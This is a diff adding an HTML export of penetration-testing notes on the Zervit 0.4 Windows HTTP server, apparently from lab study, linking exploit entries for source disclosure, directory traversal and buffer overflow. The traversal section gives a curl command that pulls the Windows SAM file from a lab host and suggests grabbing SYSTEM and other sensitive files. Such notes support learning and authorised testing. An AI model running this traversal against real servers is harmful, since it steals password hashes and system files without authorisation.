@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Zervit</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Zervit</h1></strong><br />Zervit is a Windows HTTP server.<br /><br />Georgia Weidman covers it in her book - <a href="https://docs.alexomar.com/biblioteca/penetrationtesting.pdf">https://docs.alexomar.com/biblioteca/penetrationtesting.pdf</a><br />It has lots of vulns depending on the version<br /><br /><strong><h2>## Zervit 0.4</h2></strong><br />Examples<br />• oscp 10.2.2.86 - John<br /><br /><strong><h3>### Source code disclosure</h3></strong><br /><a href="https://www.exploit-db.com/exploits/12581">https://www.exploit-db.com/exploits/12581</a><br /><br /><strong><h3>### Directory traversal </h3></strong><br /><a href="https://www.exploit-db.com/exploits/12582">https://www.exploit-db.com/exploits/12582</a><br />   ◇ Try grabbing SYSTEM and SAM files<br />      ▪ <code>curl http://10.2.2.86/index.html?../../../../../../WINDOWS/repair/sam &gt; sam</code><br />   ◇ or any other sensitive system files<br /><br /><strong><h3>### Buffer Overflow</h3></strong><br /><a href="https://www.exploit-db.com/exploits/8666">https://www.exploit-db.com/exploits/8666</a><br />   ◇ haven&#39;t found any exploits for this</div>
+</body>
+</html>
